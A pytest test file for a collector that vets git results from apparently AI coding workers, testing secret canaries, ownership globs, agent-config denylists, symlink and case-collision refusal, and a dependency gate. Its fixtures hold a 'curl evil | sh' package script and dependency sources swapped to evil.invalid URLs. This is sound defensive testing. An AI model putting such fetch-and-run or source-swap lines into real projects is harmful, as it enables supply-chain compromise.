"""Tests for lib/cloud_collect.py using real temporary git repositories."""

from __future__ import annotations

import json
import os
import shutil
import subprocess
import sys
import time
from pathlib import Path
from typing import Any, Dict, Optional

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "lib"))

import cloud_collect as cc  # noqa: E402
import cloud_sandbox  # noqa: E402
import cloud_scan  # noqa: E402

RUN, TASK, GEN, NONCE = "r1", "t1", 1, "a" * 32
GIT_ENV = {
    "GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@example.invalid",
    "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@example.invalid",
    "GIT_CONFIG_GLOBAL": os.devnull, "GIT_CONFIG_SYSTEM": os.devnull,
}
MANIFEST_PATH = ".ffs-result/%s.json" % TASK


def git(repo: Path, *args: str, stdin: str = "", check: bool = True) -> str:
    env = dict(os.environ)
    env.update(GIT_ENV)
    proc = subprocess.run(["git", "-C", str(repo)] + list(args), input=stdin, capture_output=True,
                          text=True, env=env, check=check)
    return proc.stdout.strip()


def real_validate_manifest(raw, **kwargs):
    import cloud_ledger
    return cloud_ledger.validate_manifest(raw, **kwargs)


def stub_validate(raw, *, run, task, generation, nonce, base_sha, require_nonce=True):
    data = json.loads(raw)
    for key, want in (("run", run), ("task", task), ("generation", generation), ("base_sha", base_sha)):
        if data.get(key) != want:
            raise ValueError("%s mismatch" % key)
    if require_nonce and data.get("nonce") != nonce:
        raise ValueError("nonce mismatch")
    return data


def manifest_text(base: str, **over: Any) -> str:
    body: Dict[str, Any] = {
        "schema": 1, "run": RUN, "task": TASK, "generation": GEN, "nonce": NONCE, "base_sha": base,
        "status": "complete", "summary": "did it", "decisions_needed": [], "blockers": [],
        "env_report": {"tools": {}, "present": [], "missing": []}, "tests_run": [],
    }
    body.update(over)
    return json.dumps(body, sort_keys=True)


class World:
    """origin (the worker's repo), main (operator repo), quarantine (scratch)."""

    def __init__(self, root: Path):
        self.root = root
        self.origin = root / "origin"
        self.origin.mkdir()
        git(self.origin, "init", "-q", "-b", "main")
        self.base = self.commit(self.origin, {
            "src/a/x.py": "a = 1\n", "src/b/y.py": "b = 1\n", "README.md": "hi\n",
            "src/a/lines.txt": "l1\nl2\nl3\nl4\nl5\nl6\nl7\nl8\nl9\n"}, "base")
        self.main = root / "main"
        subprocess.run(["git", "clone", "-q", str(self.origin), str(self.main)], check=True,
                       env=dict(os.environ, **GIT_ENV), capture_output=True)
        git(self.origin, "checkout", "-q", "-b", "res")

    def commit(self, repo: Path, files: Dict[str, Any], message: str = "c") -> str:
        for name, data in files.items():
            if data is None:
                git(repo, "rm", "-q", "-f", name)
            elif isinstance(data, tuple) and data[0] == "symlink":
                blob = git(repo, "hash-object", "-w", "--stdin", stdin=data[1])
                git(repo, "update-index", "--add", "--cacheinfo", "120000,%s,%s" % (blob, name))
            elif isinstance(data, tuple) and data[0] == "blob":  # case-exact path on any filesystem
                blob = git(repo, "hash-object", "-w", "--stdin", stdin=data[1])
                git(repo, "update-index", "--add", "--cacheinfo", "100644,%s,%s" % (blob, name))
            elif isinstance(data, tuple) and data[0] == "gitlink":
                git(repo, "update-index", "--add", "--cacheinfo", "160000,%s,%s" % (data[1], name))
            elif isinstance(data, tuple) and data[0] == "rename":
                git(repo, "mv", data[1], name)
            else:
                path = repo / name
                path.parent.mkdir(parents=True, exist_ok=True)
                path.write_bytes(data if isinstance(data, bytes) else data.encode())
                git(repo, "add", "--", name)
        git(repo, "commit", "-q", "--allow-empty", "-m", message)
        return git(repo, "rev-parse", "HEAD")

    def result(self, files: Dict[str, Any], *, manifest: Optional[str] = "", message: str = "work") -> str:
        files = dict(files)
        if manifest is not None:
            files[MANIFEST_PATH] = manifest or manifest_text(self.base)
        return self.commit(self.origin, files, message)

    def quarantine(self, oid: str) -> Path:
        path = self.root / ("q-%s" % oid[:8])
        path.mkdir(exist_ok=True)
        git(path, "init", "-q")
        git(path, "fetch", "-q", "--no-tags", str(self.origin), "res:refs/heads/res")
        return path

    def ctx(self, oid: str, **over: Any) -> cc.CollectCtx:
        args: Dict[str, Any] = dict(
            run=RUN, task=TASK, generation=GEN, nonce=NONCE, base_sha=self.base, oid=oid,
            quarantine=str(self.quarantine(oid)), repo=str(self.main), owns=["src/a/**"],
            validate_manifest=stub_validate)
        args.update(over)
        return cc.CollectCtx(**args)


@pytest.fixture()
def world(tmp_path: Path) -> World:
    return World(tmp_path.resolve())


def ok_changes() -> Dict[str, Any]:
    return {"src/a/x.py": "a = 2\n"}


def assert_fail(result: cc.StepResult, state: str, blocker: str) -> None:
    assert (result.ok, result.state, result.blocker) == (False, state, blocker), result


# ---------------------------------------------------------------- owns globs


@pytest.mark.parametrize("path,owns,expected", [
    ("src/a/x.py", ["src/a/**"], True),
    ("src/a/deep/er/x.py", ["src/a/**"], True),
    ("src/ab/x.py", ["src/a/**"], False),
    ("src/a", ["src/a"], True),
    ("src/a/x.py", ["src/a"], True),
    ("src/a/x.py", ["src/*/x.py"], True),
    ("src/a/b/x.py", ["src/*/x.py"], False),
    ("src/a/x.py", ["**/x.py"], True),
    ("x.py", ["**/x.py"], True),
    ("lib/test_a.py", ["lib/test_?.py"], True),
    ("src/a/x.py", ["src/b/**", "src/a/**"], True),
    ("src/a/x.py", [], False),
    ("../etc/passwd", ["**"], False),
    ("/abs", ["**"], False),
    ("src/A/x.py", ["src/a/**"], False),
])
def test_owns_match(path, owns, expected):
    assert cc.owns_match(path, owns) is expected


# ------------------------------------------------------------------- collect


def test_clean_result_collected(world):
    oid = world.result(ok_changes())
    ctx = world.ctx(oid)
    res = cc.collect(ctx)
    assert res.ok and res.state == "collected", res
    cand = res.data["candidate_oid"]
    assert cand != oid
    assert git(world.main, "rev-parse", ctx.cand_ref) == cand
    assert git(world.main, "rev-parse", cand + "^") == world.base  # single trusted parent, not the worker tip
    assert git(world.main, "rev-list", "--count", cand) == "2"
    assert git(world.main, "log", "-1", "--format=%an|%ae|%cn", cand) == "ffs-cloud|ffs-cloud@localhost.invalid|ffs-cloud"
    assert git(world.main, "ls-tree", "-r", "--name-only", cand).count(".ffs-result") == 0
    with_manifest = git(world.origin, "ls-tree", "-r", "--name-only", oid).splitlines()
    without = git(world.main, "ls-tree", "-r", "--name-only", cand).splitlines()
    assert sorted(set(with_manifest) - set(without)) == [MANIFEST_PATH]
    assert res.data["tree"] == git(world.main, "rev-parse", cand + "^{tree}")
    assert res.data["manifest"]["status"] == "complete"
    assert res.data["paths"] == ["src/a/x.py"]


def test_candidate_is_deterministic_and_reimportable(world):
    oid = world.result(ok_changes())
    first = cc.collect(world.ctx(oid))
    second = cc.collect(world.ctx(oid))
    assert first.ok and second.ok
    assert first.data["candidate_oid"] == second.data["candidate_oid"]


def test_candidate_ref_conflict(world):
    oid = world.result(ok_changes())
    ctx = world.ctx(oid)
    git(world.main, "update-ref", ctx.cand_ref, world.base)
    assert_fail(cc.collect(ctx), "needs-operator", cc.B_CANDIDATE_CONFLICT)


def test_secret_in_early_commit_later_removed(world):
    world.commit(world.origin, {"src/a/leak.txt": b"k=" + cloud_scan.canary("github-token")}, "leak")
    world.commit(world.origin, {"src/a/leak.txt": None}, "remove")
    oid = world.result(ok_changes())
    res = cc.collect(world.ctx(oid))
    assert_fail(res, "rejected", cc.B_SECRET_LEAK)
    assert "revoke or rotate" in res.detail.lower()
    assert cloud_scan.canary("github-token").decode() not in res.detail


def test_secret_only_in_merge_commit(world):
    git(world.origin, "checkout", "-q", "-b", "side")
    world.commit(world.origin, {"src/a/side.txt": "side\n"}, "side")
    git(world.origin, "checkout", "-q", "res")
    world.commit(world.origin, {"src/a/m.txt": "m\n"}, "main work")
    git(world.origin, "merge", "--no-commit", "--no-ff", "side", check=False)
    (world.origin / "src/a/merged-only.txt").write_bytes(b"t=" + cloud_scan.canary("slack-token"))
    git(world.origin, "add", "src/a/merged-only.txt")
    git(world.origin, "commit", "-q", "-m", "merge")
    oid = world.result({}, message="manifest")
    assert_fail(cc.collect(world.ctx(oid)), "rejected", cc.B_SECRET_LEAK)


def test_secret_in_commit_message_and_manifest(world):
    oid = world.result(ok_changes(), message="m " + cloud_scan.canary("aws-access-key").decode())
    assert_fail(cc.collect(world.ctx(oid)), "rejected", cc.B_SECRET_LEAK)
    oid2 = world.result({}, manifest=manifest_text(world.base, summary="tok " + cloud_scan.canary("jwt").decode()))
    assert_fail(cc.collect(world.ctx(oid2)), "rejected", cc.B_SECRET_LEAK)


def test_scan_runs_before_other_rejections(world):
    changes = {"src/b/y.py": b"k=" + cloud_scan.canary("github-token"), ".github/workflows/ci.yml": "x\n"}
    oid = world.result(changes)
    assert_fail(cc.collect(world.ctx(oid)), "rejected", cc.B_SECRET_LEAK)


def test_path_outside_owns(world):
    oid = world.result({"src/b/y.py": "b = 2\n"})
    res = cc.collect(world.ctx(oid))
    assert_fail(res, "needs-operator", cc.B_OUTSIDE_OWNS)
    assert "src/b/y.py" in res.detail


def test_new_file_outside_owns(world):
    oid = world.result({"other/new.txt": "n\n"})
    assert_fail(cc.collect(world.ctx(oid)), "needs-operator", cc.B_OUTSIDE_OWNS)


def test_deletion_outside_owns(world):
    oid = world.result({"README.md": None})
    assert_fail(cc.collect(world.ctx(oid)), "needs-operator", cc.B_OUTSIDE_OWNS)


def test_rename_out_of_owns_flags_destination(world):
    oid = world.result({"src/b/moved.py": ("rename", "src/a/x.py")})
    res = cc.collect(world.ctx(oid))
    assert_fail(res, "needs-operator", cc.B_OUTSIDE_OWNS)
    assert "src/b/moved.py" in res.detail


def test_rename_into_owns_flags_source(world):
    oid = world.result({"src/a/y_moved.py": ("rename", "src/b/y.py")})
    res = cc.collect(world.ctx(oid))
    assert_fail(res, "needs-operator", cc.B_OUTSIDE_OWNS)
    assert "src/b/y.py" in res.detail


def test_rename_inside_owns_ok(world):
    oid = world.result({"src/a/renamed.py": ("rename", "src/a/x.py")})
    res = cc.collect(world.ctx(oid))
    assert res.ok, res


def test_denylisted_path_even_when_owned(world):
    oid = world.result({"scripts/hooks/pre-commit": "#!/bin/sh\n"})
    res = cc.collect(world.ctx(oid, owns=["**"]))
    assert_fail(res, "needs-operator", cc.B_DENYLIST)
    oid2 = world.result({"src/a/setup.sh": "x\n"})
    assert_fail(cc.collect(world.ctx(oid2, owns=["**"])), "needs-operator", cc.B_DENYLIST)


def test_denylist_checks_deletion(world):
    git(world.origin, "checkout", "-q", "main")
    git(world.origin, "checkout", "-q", "-b", "res2")
    world.commit(world.origin, {".claude/settings.json": "{}\n"}, "add")
    base2 = git(world.origin, "rev-parse", "HEAD")
    oid = world.commit(world.origin, {".claude/settings.json": None, MANIFEST_PATH: manifest_text(base2)})
    git(world.origin, "branch", "-f", "res", "HEAD")
    ctx = world.ctx(oid, base_sha=base2, owns=["**"])
    assert_fail(cc.collect(ctx), "needs-operator", cc.B_DENYLIST)


def test_manifest_path_exempt_only_for_exact_path(world):
    oid = world.result({".ffs-result/other.json": "{}\n"})
    assert_fail(cc.collect(world.ctx(oid, owns=["**"])), "needs-operator", cc.B_DENYLIST)


def test_symlink_rejected(world):
    oid = world.result({"src/a/link": ("symlink", "../../secret")})
    assert_fail(cc.collect(world.ctx(oid)), "rejected", cc.B_UNSAFE_MODE)


def test_symlink_in_intermediate_commit_rejected(world):
    world.commit(world.origin, {"src/a/link": ("symlink", "target")}, "link")
    world.commit(world.origin, {"src/a/link": None}, "unlink")
    oid = world.result(ok_changes())
    assert_fail(cc.collect(world.ctx(oid)), "rejected", cc.B_UNSAFE_MODE)


def test_submodule_rejected(world):
    oid = world.result({"src/a/sub": ("gitlink", "1" * 40)})
    assert_fail(cc.collect(world.ctx(oid)), "rejected", cc.B_UNSAFE_MODE)


def test_not_descended_from_base(world):
    other = World.__new__(World)
    git(world.origin, "checkout", "-q", "--orphan", "alien")
    git(world.origin, "rm", "-rq", "--cached", ".")
    del other
    oid = world.commit(world.origin, {"src/a/x.py": "alien\n", MANIFEST_PATH: manifest_text(world.base)}, "alien")
    git(world.origin, "branch", "-f", "res", "HEAD")
    assert_fail(cc.collect(world.ctx(oid)), "rejected", cc.B_NOT_DESCENDED)


def test_base_missing_in_quarantine_is_not_descended(world):
    oid = world.result(ok_changes())
    ctx = world.ctx(oid, base_sha="2" * 40)
    assert_fail(cc.collect(ctx), "rejected", cc.B_NOT_DESCENDED)


@pytest.mark.parametrize("over", [{"nonce": "b" * 32}, {"generation": 2}, {"run": "other"}, {"task": "t9"},
                                  {"base_sha": "3" * 40}])
def test_manifest_mismatch_rejected(world, over):
    oid = world.result(ok_changes(), manifest=manifest_text(world.base, **over))
    assert_fail(cc.collect(world.ctx(oid)), "rejected", cc.B_MANIFEST_INVALID)


@pytest.mark.parametrize("over,code,nonce_matches", [
    ({"nonce": "b" * 32}, "MANIFEST_NONCE", False),
    ({"generation": 2}, "MANIFEST_MISMATCH", True),
    ({"base_sha": "3" * 40}, "MANIFEST_MISMATCH", True),
    ({"task": "t9"}, "MANIFEST_MISMATCH", True),
])
def test_manifest_rejection_carries_the_validator_code_and_the_nonce_verdict(world, over, code, nonce_matches):
    oid = world.result(ok_changes(), manifest=manifest_text(world.base, **over))
    res = cc.collect(world.ctx(oid, validate_manifest=real_validate_manifest))
    assert_fail(res, "rejected", cc.B_MANIFEST_INVALID)
    assert res.data["validator_code"] == code and res.data["nonce_matches"] is nonce_matches


def test_unparseable_manifest_reports_a_generic_code_and_no_nonce_match(world):
    oid = world.result(ok_changes(), manifest="{not json")
    res = cc.collect(world.ctx(oid, validate_manifest=real_validate_manifest))
    assert res.data["validator_code"] == "MANIFEST_BAD_JSON" and res.data["nonce_matches"] is False
    # a validator that raises something untyped (or a stub) reports the generic code, never its message
    plain = cc.collect(world.ctx(oid))
    assert plain.data["validator_code"] == "MANIFEST_UNPARSEABLE"


def test_manifest_missing_rejected_for_claude(world):
    oid = world.result(ok_changes(), manifest=None)
    assert_fail(cc.collect(world.ctx(oid)), "rejected", cc.B_MANIFEST_MISSING)


def test_manifest_not_json_rejected(world):
    oid = world.result(ok_changes(), manifest="{not json")
    assert_fail(cc.collect(world.ctx(oid)), "rejected", cc.B_MANIFEST_INVALID)


def test_manifest_blocked_needs_operator(world):
    text = manifest_text(world.base, status="blocked", blockers=["no db access"])
    oid = world.result(ok_changes(), manifest=text)
    res = cc.collect(world.ctx(oid))
    assert_fail(res, "needs-operator", cc.B_MANIFEST_BLOCKED)
    assert "no db access" in res.detail


def test_codex_without_manifest_is_synthesized(world):
    oid = world.result(ok_changes(), manifest=None)
    res = cc.collect(world.ctx(oid, provider="codex"))
    assert res.ok, res
    assert res.data["manifest"]["manifest_source"] == "synthesized"
    assert res.data["candidate_oid"] != oid
    assert git(world.main, "rev-parse", res.data["candidate_oid"] + "^") == world.base


def test_codex_with_manifest_is_validated(world):
    oid = world.result(ok_changes(), manifest=manifest_text(world.base, nonce="c" * 32))
    assert_fail(cc.collect(world.ctx(oid, provider="codex")), "rejected", cc.B_MANIFEST_INVALID)


def test_oversize_blob_rejected(world):
    oid = world.result({"src/a/big.bin": b"x" * 5000})
    assert_fail(cc.collect(world.ctx(oid, max_blob_bytes=1000)), "rejected", cc.B_BLOB_LIMIT)


def test_missing_blob_rejected_as_over_limit(world):
    oid = world.result({"src/a/big.txt": "payload\n"})
    ctx = world.ctx(oid)
    blob = git(Path(ctx.quarantine), "rev-parse", oid + ":src/a/big.txt")
    loose = Path(ctx.quarantine) / ".git" / "objects" / blob[:2] / blob[2:]
    loose.chmod(0o644)
    loose.unlink()
    assert_fail(cc.collect(ctx), "rejected", cc.B_BLOB_LIMIT)


def test_too_many_commits(world):
    world.commit(world.origin, {"src/a/one.txt": "1\n"}, "one")
    oid = world.result(ok_changes())
    assert_fail(cc.collect(world.ctx(oid, max_commits=1)), "rejected", cc.B_TOO_MANY_COMMITS)


def test_scan_failure_needs_operator(world, monkeypatch):
    oid = world.result(ok_changes())

    def refuse(*_a, **_k):
        raise cloud_scan.ScanRefused("git-error")

    monkeypatch.setattr(cloud_scan, "scan_git_objects", refuse)
    assert_fail(cc.collect(world.ctx(oid)), "needs-operator", cc.B_SCAN_REFUSED)


# ------------------------------------------------------- worker history (K1)


def test_denylisted_change_restored_in_a_later_commit_still_blocks(world):
    world.commit(world.origin, {".claude/settings.json": "{}\n"}, "plant")
    world.commit(world.origin, {".claude/settings.json": None}, "restore")
    oid = world.result(ok_changes())
    assert sorted(cc.changed_paths(world.ctx(oid, owns=["**"]))) == [("A", [MANIFEST_PATH]), ("M", ["src/a/x.py"])]
    assert_fail(cc.collect(world.ctx(oid, owns=["**"])), "needs-operator", cc.B_DENYLIST)


def test_nested_agent_config_in_history_blocks(world):
    world.commit(world.origin, {"src/a/.codex/config.toml": "x\n"}, "plant")
    world.commit(world.origin, {"src/a/.codex/config.toml": None}, "restore")
    oid = world.result(ok_changes())
    assert_fail(cc.collect(world.ctx(oid)), "needs-operator", cc.B_DENYLIST)


def test_unowned_change_restored_in_a_later_commit_still_blocks(world):
    world.commit(world.origin, {"src/b/y.py": "b = 2\n"}, "touch")
    world.commit(world.origin, {"src/b/y.py": "b = 1\n"}, "restore")
    oid = world.result(ok_changes())
    res = cc.collect(world.ctx(oid))
    assert_fail(res, "needs-operator", cc.B_OUTSIDE_OWNS)
    assert res.data["paths"] == ["src/b/y.py"]


def test_candidate_drops_worker_history(world):
    world.commit(world.origin, {"src/a/scratch.txt": "tmp\n"}, "scratch")
    middle = git(world.origin, "rev-parse", "HEAD")
    world.commit(world.origin, {"src/a/scratch.txt": None}, "unscratch")
    oid = world.result(ok_changes())
    res = cc.collect(world.ctx(oid))
    assert res.ok, res
    cand = res.data["candidate_oid"]
    assert git(world.main, "rev-list", "--parents", "-n1", cand).split()[1:] == [world.base]
    assert git(world.main, "cat-file", "-e", middle, check=False) == ""
    assert subprocess.run(["git", "-C", str(world.main), "cat-file", "-e", middle], capture_output=True).returncode != 0
    assert subprocess.run(["git", "-C", str(world.main), "cat-file", "-e", oid], capture_output=True).returncode != 0
    assert git(world.main, "diff", "--name-only", world.base, cand).splitlines() == ["src/a/x.py"]


def test_codex_result_without_manifest_also_gets_a_clean_candidate(world):
    oid = world.result(ok_changes(), manifest=None)
    res = cc.collect(world.ctx(oid, provider="codex"))
    assert res.ok, res
    assert res.data["candidate_oid"] != oid
    assert git(world.main, "rev-parse", res.data["candidate_oid"] + "^") == world.base


def test_case_variant_path_colliding_with_a_base_path_is_refused(world):
    oid = world.result({"src/a/X.py": ("blob", "a = 3\n")})
    res = cc.collect(world.ctx(oid))
    assert_fail(res, "needs-operator", cc.B_DENYLIST)
    assert res.data["reason"] == "case-collision" and res.data["paths"] == ["src/a/X.py"]


def test_two_result_paths_colliding_with_each_other_are_refused(world):
    oid = world.result({"src/a/new.py": ("blob", "1\n"), "src/a/NEW.py": ("blob", "2\n")})
    assert_fail(cc.collect(world.ctx(oid)), "needs-operator", cc.B_DENYLIST)


def test_nested_case_variant_denylist_names_are_refused(world):
    oid = world.result({"src/a/CLAUDE.MD": ("blob", "x\n")})
    assert_fail(cc.collect(world.ctx(oid)), "needs-operator", cc.B_DENYLIST)


@pytest.mark.parametrize("path", [
    "src/a/.c\u200claude/settings.json", "src/a/CLAU\u200cDE.md", "src/a/.np\ufeffmrc", "src/a/ok\x07.txt",
    "src/a/caf\u00ad.txt"])
def test_paths_with_invisible_or_control_characters_are_refused(world, path):
    oid = world.result({path: ("blob", "x\n")})
    res = cc.collect(world.ctx(oid))
    assert_fail(res, "needs-operator", cc.B_DENYLIST)
    assert res.data["paths"] == [path]


def test_case_rename_is_not_flagged_when_the_old_spelling_is_deleted(world):
    oid = world.result({"src/a/x.py": None, "src/a/X.py": ("blob", "a = 1\n")})
    assert cc.collect(world.ctx(oid)).ok


def test_json_escaped_secret_in_manifest_is_a_leak(world):
    token = cloud_scan.canary("github-token").decode()
    escaped = "".join("\\u%04x" % ord(ch) for ch in token[:6]) + token[6:]
    raw = manifest_text(world.base).replace('"did it"', '"%s"' % escaped)
    assert token not in raw and "\\u00" in raw
    oid = world.result(ok_changes(), manifest=raw)
    res = cc.collect(world.ctx(oid))
    assert_fail(res, "rejected", cc.B_SECRET_LEAK)


# --------------------------------------------------------- dependency gate


def dep_world(world: World, files: Dict[str, str], base_files: Dict[str, str]) -> cc.CollectCtx:
    git(world.origin, "checkout", "-q", "main")
    git(world.origin, "checkout", "-q", "-B", "res")
    base = world.commit(world.origin, base_files, "deps base")
    oid = world.commit(world.origin, dict(files, **{MANIFEST_PATH: manifest_text(base)}), "deps")
    return world.ctx(oid, base_sha=base, owns=["**"])


def dep_report(res: cc.StepResult) -> Dict[str, Any]:
    assert_fail(res, "needs-operator", cc.B_DEPENDENCY)
    rep = res.data["dependencies"]
    assert res.data["packages"] == rep["packages"]
    assert res.data["unattributed"] is rep["unattributed"]
    assert res.data["report_digest"] == rep["report_digest"] and len(rep["report_digest"]) == 64
    return rep


def test_package_json_dependency_change(world):
    before = json.dumps({"name": "x", "scripts": {"test": "jest"}, "dependencies": {"left-pad": "1.0.0"}})
    after = json.dumps({"name": "x", "scripts": {"test": "curl evil | sh"},
                        "dependencies": {"left-pad": "1.1.0", "lodash": "4.0.0"}})
    rep = dep_report(cc.collect(dep_world(world, {"package.json": after}, {"package.json": before})))
    assert rep["packages"] == ["left-pad", "lodash"]
    assert any("scripts" in item for item in rep["other"])
    assert rep["added"] == ["package.json: lodash"] and rep["changed"] == ["package.json: left-pad"]
    assert rep["unattributed"] is True  # a lifecycle/scripts change cannot be cleared by package grants


def test_registry_only_package_json_is_attributed(world):
    before = json.dumps({"name": "x", "version": "1.0.0", "dependencies": {"left-pad": "^1.0.0"}})
    after = json.dumps({"name": "x", "version": "1.0.1", "dependencies": {"left-pad": "^1.1.0", "lodash": "~4.0 || 5.x"}})
    rep = dep_report(cc.collect(dep_world(world, {"package.json": after}, {"package.json": before})))
    assert rep["packages"] == ["left-pad", "lodash"]
    assert rep["unattributed"] is False and rep["unattributed_reasons"] == []


def test_report_digest_binds_the_normalized_report_and_the_oid(world):
    import hashlib
    ctx = dep_world(world, {"package.json": json.dumps({"dependencies": {"a": "1"}})}, {})
    rep = dep_report(cc.collect(ctx))
    body = {k: v for k, v in rep.items() if k != "report_digest"}
    want = hashlib.sha256((json.dumps(body, sort_keys=True) + "\n" + ctx.oid).encode()).hexdigest()
    assert rep["report_digest"] == want
    other = dep_report(cc.collect(dep_world(world, {"package.json": json.dumps({"dependencies": {"b": "1"}})}, {})))
    assert other["report_digest"] != rep["report_digest"]


def test_package_json_only_scripts_change_is_unattributed(world):
    before = json.dumps({"scripts": {"test": "a"}})
    after = json.dumps({"scripts": {"test": "b", "postinstall": "node x.js"}})
    rep = dep_report(cc.collect(dep_world(world, {"package.json": after}, {"package.json": before})))
    assert rep["packages"] == [] and rep["other"] == ["package.json: scripts"]
    assert rep["unattributed"] is True


@pytest.mark.parametrize("spec", ["git+https://evil.invalid/x.git", "github:evil/x", "evil/x", "file:../x",
                                   "npm:evil@1.0.0", "https://evil.invalid/x.tgz", "link:../x", "workspace:*"])
def test_npm_source_swap_is_unattributed(world, spec):
    before = json.dumps({"dependencies": {"lodash": "4.0.0"}})
    swapped = dep_report(cc.collect(dep_world(world, {"package.json": json.dumps({"dependencies": {"lodash": spec}})},
                                              {"package.json": before})))
    assert swapped["packages"] == ["lodash"] and swapped["unattributed"] is True
    added = dep_report(cc.collect(dep_world(world, {"package.json": json.dumps({"dependencies": {"lodash": "4.0.0", "new": spec}})},
                                            {"package.json": before})))
    assert added["packages"] == ["new"] and added["unattributed"] is True


def test_lockfile_only_change_is_unattributed(world):
    rep = dep_report(cc.collect(dep_world(world, {"package-lock.json": '{"packages": {"x": {"resolved": "https://evil"}}}'},
                                          {"package-lock.json": '{"packages": {}}'})))
    assert rep["packages"] == [] and rep["unattributed"] is True
    assert "package-lock.json: content" in rep["other"]


def test_requirements_change(world):
    res = cc.collect(dep_world(world, {"requirements-dev.txt": "requests==2.0\nflask>=2\n--index-url http://x\n"},
                               {"requirements-dev.txt": "requests==1.0\n"}))
    rep = dep_report(res)
    assert rep["packages"] == ["flask", "requests"]
    assert rep["other"] == ["requirements-dev.txt: option change"]
    assert rep["unattributed"] is True  # an index option is not attributable to a package


def test_plain_requirements_are_attributed(world):
    rep = dep_report(cc.collect(dep_world(
        world, {"requirements.txt": "requests[socks]>=2.0,<3 ; python_version>'3'\nflask==2.0 --hash=sha256:ab\n"}, {})))
    assert rep["packages"] == ["flask", "requests"] and rep["unattributed"] is False


@pytest.mark.parametrize("line", ["evil @ https://evil.invalid/x.zip", "git+https://evil.invalid/x.git#egg=evil",
                                  "./local", "evil==1.0 @ file:///x"])
def test_requirements_non_registry_is_unattributed(world, line):
    rep = dep_report(cc.collect(dep_world(world, {"requirements.txt": line + "\n"}, {})))
    assert rep["unattributed"] is True


@pytest.mark.parametrize("name,before,after", [
    ("pyproject.toml", '[project]\ndependencies = ["requests"]\n', '[project]\ndependencies = ["requests", "evil"]\n'),
    ("Cargo.toml", '[dependencies]\nserde = "1"\n', '[dependencies]\nserde = "1"\ntokio = "1"\n'),
    ("go.mod", "module x\n\nrequire github.com/a/b v1.1.0\n", "module x\n\nrequire github.com/a/b v1.2.0\n"),
    ("Gemfile", 'gem "rails"\n', 'gem "rails"\ngem "evil"\n'),
    ("Pipfile", '[packages]\nrequests = "*"\n', '[packages]\nrequests = "*"\nevil = "*"\n'),
    ("uv.lock", "orig\n", "changed\n"),
    ("Cargo.lock", "orig\n", "changed\n"),
])
def test_unparsed_ecosystems_are_always_unattributed(world, name, before, after):
    rep = dep_report(cc.collect(dep_world(world, {name: after}, {name: before})))
    assert rep["packages"] == [] and rep["unattributed"] is True
    assert rep["files"] == [name]


def test_repeated_requirement_declarations_are_unattributed(world):
    base = "foo==1; sys_platform == 'linux'\nfoo==2; sys_platform == 'darwin'\n"
    new = "foo==1.1; sys_platform == 'linux'\nfoo==2; sys_platform == 'darwin'\nbar\n"
    rep = dep_report(cc.collect(dep_world(world, {"requirements.txt": new}, {"requirements.txt": base})))
    assert rep["unattributed"] is True and rep["packages"] == ["bar"]


def test_repeated_npm_declaration_across_sections_is_unattributed(world):
    before = json.dumps({"dependencies": {"a": "^1.0.0"}, "devDependencies": {"a": "^2.0.0"}})
    after = json.dumps({"dependencies": {"a": "^1.1.0", "b": "1.0.0"}, "devDependencies": {"a": "^2.0.0"}})
    rep = dep_report(cc.collect(dep_world(world, {"package.json": after}, {"package.json": before})))
    assert rep["unattributed"] is True


def test_removing_the_last_dependency_takes_the_unattributed_grant_path(world):
    before = json.dumps({"name": "x", "dependencies": {"a": "1"}})
    after = json.dumps({"name": "x", "dependencies": {}})
    rep = dep_report(cc.collect(dep_world(world, {"package.json": after}, {"package.json": before})))
    assert rep["packages"] == [] and rep["removed"] == ["package.json: a"] and rep["unattributed"] is True


def test_non_dependency_package_json_change_passes_without_a_grant(world):
    before = json.dumps({"name": "x", "version": "1.0.0", "dependencies": {"a": "^1.0.0"}})
    after = json.dumps({"name": "x", "version": "1.0.1", "dependencies": {"a": "^1.0.0"}})
    res = cc.collect(dep_world(world, {"package.json": after}, {"package.json": before}))
    assert res.ok, res


@pytest.mark.parametrize("name", ["pom.xml", "build.gradle", "Package.swift", "pubspec.yaml", "deno.json"])
def test_other_ecosystem_manifests_are_opaque_and_unattributed(world, name):
    rep = dep_report(cc.collect(dep_world(world, {name: "changed\n"}, {name: "orig\n"})))
    assert rep["unattributed"] is True


def test_dependency_file_touched_and_restored_in_history_is_reported(world):
    git(world.origin, "checkout", "-q", "main")
    git(world.origin, "checkout", "-q", "-B", "res")
    base = world.commit(world.origin, {"package.json": json.dumps({"dependencies": {"a": "1"}})}, "deps base")
    world.commit(world.origin, {"package.json": json.dumps({"dependencies": {"a": "git+https://evil.invalid/a.git"}})}, "swap")
    world.commit(world.origin, {"package.json": json.dumps({"dependencies": {"a": "1"}})}, "restore")
    oid = world.commit(world.origin, {"src/a/x.py": "a = 2\n", MANIFEST_PATH: manifest_text(base)}, "work")
    rep = dep_report(cc.collect(world.ctx(oid, base_sha=base, owns=["**"])))
    assert rep["unattributed"] is True and "touched in worker history" in " ".join(rep["unattributed_reasons"])


def test_dependency_file_deletion_and_addition(world):
    ctx = dep_world(world, {"package.json": json.dumps({"dependencies": {"a": "1"}})}, {})
    assert dep_report(cc.collect(ctx))["added"] == ["package.json: a"]


def test_unparsable_dependency_file_is_reported(world):
    res = cc.collect(dep_world(world, {"package.json": "{broken"}, {"package.json": "{}"}))
    assert dep_report(res)["unattributed"] is True
    assert "unparsable" in res.detail


def test_accepted_dependencies_continue(world):
    ctx = dep_world(world, {"requirements.txt": "flask\n"}, {})
    ctx.deps_accepted = True
    res = cc.collect(ctx)
    assert res.ok and res.data["dependencies"]["packages"] == ["flask"]
    assert res.data["report_digest"] == res.data["dependencies"]["report_digest"]


def test_accepted_digest_must_still_match(world):
    ctx = dep_world(world, {"requirements.txt": "flask\n"}, {})
    digest = dep_report(cc.collect(ctx))["report_digest"]
    ctx.deps_accepted, ctx.accepted_digest = True, digest
    assert cc.collect(ctx).ok
    ctx.accepted_digest = "0" * 64
    res = cc.collect(ctx)
    assert_fail(res, "needs-operator", cc.B_DEPENDENCY)
    assert "changed since it was accepted" in res.detail


def test_non_dependency_json_is_not_gated(world):
    res = cc.collect(dep_world(world, {"data.json": "{}"}, {}))
    assert res.ok, res


# ------------------------------------------------------------------- review


MODEL_OK = "CLOUD-REVIEW-MODEL: requested=gpt-6.2-sol answered=gpt-6.2-sol descent=0\n"


def candidate_for(world: World):
    oid = world.result(ok_changes())
    res = cc.collect(world.ctx(oid))
    assert res.ok
    return res.data


def test_review_approve_records_hashes(world):
    data = candidate_for(world)
    calls = []
